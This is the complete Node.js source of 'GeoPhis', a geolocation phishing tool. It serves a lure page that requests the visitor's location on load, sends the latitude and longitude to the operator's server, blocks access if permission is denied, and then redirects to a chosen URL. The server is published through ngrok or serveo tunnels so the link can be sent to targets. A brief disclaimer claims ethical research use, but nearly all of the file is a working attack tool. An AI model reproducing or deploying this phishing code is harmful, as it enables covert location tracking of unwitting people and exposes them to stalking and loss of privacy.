const fs = require("fs");
const http = require("http");
const { spawn } = require("child_process");
const ngrok = require("@ngrok/ngrok");
const args = process.argv.slice(2);

const red = `\x1b[31m`;
const green = "\x1b[32m";
const yellow = "\x1b[33m";
const reset = "\x1b[0m";
const bold = "\x1b[1m";
const faint = "\x1b[2m";
const underline = "\x1b[4m";

const geophis = `
                         ${green}&&&&&${reset}          GeoPhis - Geolocation Phising via Nodejs HTTP Server
                     ${green}&&&&     &${reset}
                  ${green}&&&    &&&&&${reset}          Usage: node geophis [Options]
               ${green}&&    &&&&${reset}&&& &
             ${green}&&   &&&${reset} &&&&   &          Options:
            ${green}&   &&${reset} &&&&      &           -p <PORT> : Port for HTTP Server
         ${green}&&   &&${reset}&&           &           -t ngrok|serveo : Methode tunneling with ngrok/serveo
        ${green}&&  &&${reset}               &           -wl <URL>|none : Destination link after get location
       ${green}&& &&${reset}&&             ${red}&&&&&${reset}
      ${green}&  &&${reset} &&           ${red}&&&&&&&&&${reset}      Example:
     ${green}&  &&${reset}  &&          ${red}&&&     &&&${reset}      node geophis -p 8080 -t ngrok -wl http://example.com
    ${green}&& &&${reset}  &&           ${red}&&&     &&&${reset}      node geophis -p 8080 -t serveo -wl mone
    ${green}&  &${reset}  &&             ${red}&&&&&&&&&${reset}
   ${green}&${reset}  ${yellow}&&&&&${reset}               ${red}&&&&&&&${reset}       \x1b[41m${underline}Legal disclaimer${reset}
  ${green}&&${reset} ${yellow}&$     &&${reset}             ${red}&&&&&${reset}        ${faint}GeoPhis is developed and distributed for ethical research${reset}
 ${green}&&  ${yellow}&  &&  &&${reset}              ${red}&&&${reset}         ${faint}purposes only, and demonstration. The developers of this${reset}
 ${green}&    ${yellow}&     && &${reset}             ${red}&${reset}          ${faint}tool are not responsible for any misuse.${reset}
 ${green}&    ${yellow}&&&& &&  &${reset}
${green}&&    &     ${yellow}&  &${reset}
${green}&&    &      ${yellow}&${reset}                          Source: ${underline}${green}https://github.com/ZeltNamizake/geophis${reset}
 ${green}&&&&&${reset}`;
 
let htmlContent = `
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Allow for Access</title>
    <script>
      window.onload = function () {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            sendPositionToServer,
            showError
          );
        } else {
          console.log("Geolocation not supported.");
        }
      };

      function sendPositionToServer(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        fetch("/geophis", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ latitude, longitude })
        })
        .then(response => {
          if (response.ok) {
            window.location.href = "WINDOW_LINK";
          }
        })
        .catch(err => console.error("Failed to send location:", err));
      }

      function showError(error) {
        switch (error.code) {
          case error.PERMISSION_DENIED:
            alert("You must enable permission location to access");
            break;
          case error.UNKNOWN_ERROR:
            alert("Unknown Error");
            break;
        }
      }
    </script>
  </head>
  <body>
    <p>Waiting...</p>
  </body>
</html>
`;

function HTTPServer(port, windowLink) {
    return new Promise(resolve => {
        const server = http.createServer((req, res) => {
            if (req.method === "GET" && req.url === "/") {
                res.writeHead(200, { "Content-Type": "text/html" });
                let data = htmlContent.replace("WINDOW_LINK", windowLink);
                res.end(data);
            } else if (req.method === "POST" && req.url === "/geophis") {
                let body = "";

                req.on("data", chunk => {
                    body += chunk.toString();
                });

                req.on("end", () => {
                    try {
                        const data = JSON.parse(body);
                        const { latitude, longitude } = data;

                        console.log(`\n${yellow}${underline}Location received:${reset}`);
                        console.log(
                            `[+] Latitude: ${latitude} Longitude: ${longitude}`
                        );

                        res.writeHead(200, { "Content-Type": "text/plain" });
                        res.end("Location received");
                    } catch (e) {
                        console.error("[!] Failed parsing data:", e);
                        res.writeHead(400, { "Content-Type": "text/plain" });
                        res.end("Bad Request");
                    }
                });
            } else if (req.url === "/none") {
                res.writeHead(200, { "Content-Type": "text/plain" });
                res.end("Not Found");
            } else {
                res.writeHead(404, { "Content-Type": "text/plain" });
                res.end("Not Found");
            }
        });
        server.listen(port, () => {
            resolve(true);
        });
        server.on("error", err => {
            console.log(`[!] HTTP server error:\n${err.message}`);
            resolve(false);
        });
    });
}

function forwardHTTPServer(services, port) {
    return new Promise(resolve => {
        if (services === "serveo") {
            const serveo = spawn("ssh", [
                "-R",
                `80:localhost:${port}`,
                "serveo.net"
            ]);

            serveo.stdout.on("data", data => {
                let urlPublic = data
                    .toString()
                    .split("Forwarding HTTP traffic from")[1];
                if (urlPublic) {
                    console.log(`[i] URL: ${green}${urlPublic}${reset}`);
                    resolve(true);
                }
            });

            serveo.on("close", code => {
                console.log(`[!] Serveo tunnel closed with code ${code}`);
                resolve(false);
                process.exit(0);
            });

            serveo.on("error", err => {
                console.error(
                    `[!] Failed to start Serveo tunnel:\n${err.message}`
                );
                resolve(false);
                process.exit(0);
            });
        }
        if (services === "ngrok") {
            if (!fs.existsSync(".ngrok_authtoken.txt")) {
                const readline = require("readline").createInterface({
                    input: process.stdin,
                    output: process.stdout
                });
                console.log("[!] Authentication token not found.");
                readline.question(
                    "Enter your authentication token ngrok: ",
                    token => {
                        if (token.length > 0) {
                            try {
                                fs.writeFileSync(".ngrok_authtoken.txt", token);
                                console.log(
                                    "[+] Success add authentication token, please restart script."
                                );
                                resolve(true);
                                process.exit(0)
                            } catch (e) {
                                console.log(
                                    "[!] Failed add authentication token"
                                );
                                readline.close();
                                resolve(false);
                            }
                        } else {
                            console.log("[!] Failed add authentication token");
                            resolve(false);
                            readline.close();
                        }
                    }
                );
            } else {
                const ngrokToken = fs.readFileSync(
                    ".ngrok_authtoken.txt",
                    "utf8"
                );
                ngrok
                    .forward({
                        addr: port,
                        authtoken: ngrokToken,
                        proto: "http"
                    })
                    .then(res => {
                        console.log(`[i] URL: ${green}${res.url()}${reset}`);
                        resolve(true);
                    })
                    .catch(e => {
                        console.log(
                            `[!] Failed forwarding HTTP server via ngrok:\n${e.message}`
                        );
                        resolve(false);
                        process.exit(0);
                    });
            }
        }
    });
}
async function runScript() {
    if (
        args[0] === "-p" &&
        args[1] &&
        args[2] === "-t" &&
        args[3] &&
        args[4] === "-wl" &&
        args[5]
    ) {
        let portHTTP = args[1];
        let methodeTunnel;
        let runHTTPServer;
        if (isNaN(portHTTP)) {
            console.log(`[!] Invalid port number: ${portHTTP}`);
            process.exit(0);
        }
        if (args[5] === "none") {
            runHTTPServer = await HTTPServer(portHTTP, "none");
            console.log(`[+] HTTP server running with localhost:${portHTTP}`);
        } else if (args[5].includes("://")) {
            runHTTPServer = await HTTPServer(portHTTP, args[5]);
            console.log(`[+] HTTP server running with localhost:${portHTTP}`);
        } else {
            console.log(
                `[!] Window link href invalid, try '${bold}<url>${reset}' or '${bold}none${reset}'`
            );
        }
        let servicesTunnel;
        if (runHTTPServer) {
            if (args[3] === "serveo") {
                servicesTunnel = await forwardHTTPServer("serveo", portHTTP);
            } else if (args[3] === "ngrok") {
                servicesTunnel = await forwardHTTPServer("ngrok", portHTTP);
            } else if (!methodeTunnel === "ngrok" || "serveo") {
                console.log(
                    `[!] Methode tunneling invalid, try '${bold}serveo${reset}' or '${bold}ngrok${reset}'`
                );
                process.exit(0);
            }
        }
    } else if (args[0] === "-h") {
        console.log(geophis);
    } else {
        console.log(
            `[i] Try '${bold}node geophis -h${reset} for more information'`
        );
    }
}
runScript();
